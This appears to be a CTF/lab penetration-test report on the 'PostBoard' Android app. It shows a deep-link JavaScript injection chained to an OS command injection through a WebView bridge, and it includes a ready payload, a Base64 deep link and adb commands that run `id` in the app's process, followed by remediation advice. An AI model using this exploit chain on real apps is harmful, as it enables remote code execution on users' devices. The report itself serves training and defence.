# Mobile App Pentest — `com.mobilehackinglab.postboard` ("PostBoard")

**Target:** `com.mobilehackinglab.postboard.apk` — Mobile Hacking Lab "PostBoard" challenge
**Platform:** Android (minSdk 24, targetSdk 34)
**Basis:** CTF / lab / training
**Date:** 2026-11-02
**Verification:** **Dynamically confirmed on-device.** Firing the exported deep link ran the full
chain — JS-string breakout → `postCowsayMessage` bridge → `sh -c` — and the injected `id` wrote the
app's private files dir, its output showing `uid=10183(u0_a183)` (the **PostBoard** process,
`untrusted_app`, in the `inet` group), not the shell caller. The code path (deep link →
`javascript:` eval → JS-bridge → `sh -c`) is unconditional.

---

## Summary

PostBoard is a markdown message board rendered in a `WebView`. The `WebView` has JavaScript enabled
and a JavaScript interface (`WebAppInterface`) bound into the page, and `MainActivity` is **exported
with a `BROWSABLE` deep link** (`postboard://postmessage/...`). An externally-supplied deep link is
fed — with grossly insufficient sanitization — into a `javascript:` URL, giving an attacker
**arbitrary JavaScript in the bridged WebView**. One of the bridge methods runs a shell command
built by string concatenation, so that JavaScript pivots to **OS command execution in the app's
process**.

Full chain, reachable from a single link / any other app:

```
postboard://postmessage/<base64>  →  handleIntent(): Base64-decode, escape only ' → \'
  →  loadUrl("javascript:WebAppInterface.postMarkdownMessage('<msg>')")   ← string breakout
  →  injected JS calls WebAppInterface.postCowsayMessage("…;<cmd>")
  →  CowsayUtil.runCowsay(): Runtime.exec(["/bin/sh","-c", script + " " + msg])   =  RCE
```

| ID | Finding | Severity | MASVS |
|----|---------|----------|-------|
| PB-01 | JavaScript injection — exported deep link fed into a `javascript:` URL with only `' → \'` escaping (backslash not escaped) → arbitrary JS in a JS-bridged WebView — **confirmed on-device** | **Critical** | MASVS-PLATFORM-2 / MASVS-CODE-4 |
| PB-02 | OS command injection — `CowsayUtil.runCowsay` runs `sh -c "<script> " + message`; `message` reachable via the `postCowsayMessage` JS bridge → RCE — **confirmed on-device** | **Critical** | MASVS-CODE-4 / MASVS-PLATFORM-2 |
| PB-03 | `addJavascriptInterface` exposes native methods to any JS the WebView runs (no `@JavascriptInterface` allow-listing beyond the four methods; the command sink is one of them) | High | MASVS-PLATFORM-2 |
| PB-04 | `android:debuggable="true"` in shipped APK | Medium | MASVS-RESILIENCE-1 |
| PB-05 | `android:allowBackup="true"` (app data extractable via `adb backup`) | Medium | MASVS-STORAGE-2 |

---

## PB-01 — JavaScript injection via the exported deep link

**Manifest** — `MainActivity` is exported with a browsable `VIEW` filter:
```xml
<activity android:name="...MainActivity" android:exported="true">
    <intent-filter> <!-- LAUNCHER --> </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="postboard" android:host="postmessage"/>
    </intent-filter>
</activity>
```

**The sink** — `handleIntent()` takes the deep link's path, Base64-decodes it (URL-safe, flag `8`),
applies a **single** transformation, and concatenates the result into a `javascript:` URL:
```java
String path = data.getPath();
byte[] decode = Base64.decode(path.drop(1), 8);                 // URL_SAFE
String message = new String(decode, UTF_8).replace("'", "\\'"); // ONLY ' is escaped
webView.loadUrl("javascript:WebAppInterface.postMarkdownMessage('" + message + "')");
```

Escaping only the single quote is not enough, because **the backslash is left untouched**. Supplying
`\'` in the decoded message becomes `\\'` after the transform:

- The app builds `...postMarkdownMessage('\\')...`.
- In JavaScript, `'\\'` is a *complete* string literal (one escaped backslash) — so **the string
  closes** and everything after it is executed as code.

That is a full JavaScript-injection primitive. The attacker then uses **double-quoted** strings for
their own JS (the escaping never touches `"`), so nothing in the payload gets mangled.

---

## PB-02 — OS command injection reached from the JS bridge (the RCE)

`WebAppInterface` is bound into the WebView and exposes `postCowsayMessage`, which forwards straight
to the command runner:
```java
@JavascriptInterface public void postCowsayMessage(String cowsayMessage) {
    String asciiArt = CowsayUtil.INSTANCE.runCowsay(cowsayMessage);   // sink
    ... /* output is HTML-escaped AFTER the command already ran */
}
```
```java
// CowsayUtil.runCowsay(message)
String[] command = {"/bin/sh", "-c", scriptPath + ' ' + message};   // concatenated into sh -c
Runtime.getRuntime().exec(command);
```
`message` is placed, unquoted, into a `sh -c` string, so shell metacharacters in it (`;`, `$(…)`,
`` ` `` …) execute. The HTML-escaping in `postCowsayMessage` only sanitizes the *output* shown back
to the page — it runs *after* `runCowsay`, so it does nothing to stop the injection. (`cowsay.sh` is
unpacked from assets to the app's files dir and marked executable at startup by
`CowsayUtil.initialize`.)

Because PB-01 gives attacker-controlled JS, that JS simply calls
`WebAppInterface.postCowsayMessage("x;<command>")` to run arbitrary commands as the app.

### Exploit — decoded message (what we inject)
```
\');WebAppInterface.postCowsayMessage("x;id>/sdcard/pb_pwned.txt");//
```
After the app's `' -> \'` transform, the executed line is:
```javascript
javascript:WebAppInterface.postMarkdownMessage('\\');WebAppInterface.postCowsayMessage("x;id>/sdcard/pb_pwned.txt");//')
```
- `postMarkdownMessage('\\')` → harmless call with the string `\`; the `\\'` closed the literal.
- `;` ends that statement; `WebAppInterface.postCowsayMessage("x;id>/sdcard/pb_pwned.txt")` runs.
- `runCowsay` executes `/bin/sh -c "<script> x;id>/sdcard/pb_pwned.txt"`; the `;` splits it, so
  `id>/sdcard/pb_pwned.txt` runs as the **PostBoard** process.
- trailing `;//` comments out the app's leftover `')`.

### PoC (deliver the deep link) — confirmed on-device
PostBoard holds **no storage permission** (only `INTERNET`), so the proof file is written to the
app's own private dir (always writable as the app uid) and read back with `run-as` (the app is
`debuggable`). Force-stop first so the deep link arrives via a fresh `onCreate` — otherwise it lands
in `onNewIntent` (not overridden) and `getIntent()` returns the stale launcher intent, so
`handleIntent()` ignores it.
```bash
adb shell am force-stop com.mobilehackinglab.postboard

# decoded msg: \');WebAppInterface.postCowsayMessage("x;id>/data/data/com.mobilehackinglab.postboard/files/pb_pwned.txt");//
adb shell am start -a android.intent.action.VIEW \
  -d "postboard://postmessage/XCcpO1dlYkFwcEludGVyZmFjZS5wb3N0Q293c2F5TWVzc2FnZSgieDtpZD4vZGF0YS9kYXRhL2NvbS5tb2JpbGVoYWNraW5nbGFiLnBvc3Rib2FyZC9maWxlcy9wYl9wd25lZC50eHQiKTsvLw=="

adb shell "run-as com.mobilehackinglab.postboard cat files/pb_pwned.txt"
```
**Result (confirmed on-device):** `uid=10183(u0_a183) … groups=…,3003(inet),… context=u:r:untrusted_app:s0:…`
— the command ran inside the **PostBoard** process (not the shell caller), proving RCE. A browser
link or any other app firing the same `VIEW` intent achieves the same — no permissions required of
the caller. (An attacker wanting files off the device would redirect output over `INTERNET` rather
than to `/sdcard`, which the app can't write.)

---

## PB-03 — Overexposed JavaScript bridge
`addJavascriptInterface(new WebAppInterface(), "WebAppInterface")` exposes native methods to every
script the WebView runs. One of them (`postCowsayMessage`) is a command runner, so any JS-execution
bug (PB-01) becomes RCE. Even absent PB-01, exposing a shell-backed method to web content is unsafe.

## PB-04 / PB-05 — Device-posture weaknesses
- **`debuggable="true"`** → `run-as`/debugger access to app-private data on any device.
- **`allowBackup="true"`** → `adb backup` can pull app-private data off the device.

---

## Root cause & remediation
- **Never build a `javascript:` URL by string concatenation of untrusted input.** Use
  `WebView.evaluateJavascript` with a value passed through a real JSON/JS encoder, or better, deliver
  data to the page via a typed channel — don't interpolate into script text. Ad-hoc quote-escaping
  (here, only `'`) is not a security boundary.
- **Don't shell out, and never concatenate into `sh -c`.** Implement "cowsay" in-process, or if an
  external process is unavoidable, pass arguments as separate `argv` elements with no shell and
  validate them. Remove the `postCowsayMessage` → `runCowsay` path from the web-reachable bridge.
- **Minimize the JavaScript bridge.** Only expose methods that are safe for hostile web content to
  call; never expose a command/exec capability. Consider `WebMessageListener` with an allow-listed
  origin instead of `addJavascriptInterface`.
- **Lock down the entry point.** Treat the exported deep link as hostile input; validate/reject it,
  and don't auto-process it into script. Disable `debuggable`/`allowBackup` for release builds.

---

## Appendix — environment & method
- Tools: `unzip`, `jadx` (decompile + manifest decode), Python (offline payload build: simulate the
  `' -> \'` escape, URL-safe Base64); exploitation reproduced by the user on an Android emulator via
  `adb` (deep link → `id` written to the app's files dir as uid `u0_a183`). No native libs; assets
  are `index.html` + `cowsay.sh`.
- App classes: `MainActivity` (exported; WebView setup + `handleIntent` deep-link sink),
  `WebAppInterface` (`@JavascriptInterface` methods incl. `postCowsayMessage`), `WebAppChromeClient`
  (JS alert dialog), `defpackage.CowsayUtil` (unpacks `cowsay.sh`, `runCowsay` = the `sh -c` sink),
  `defpackage.WebAppCache` (in-memory message list).
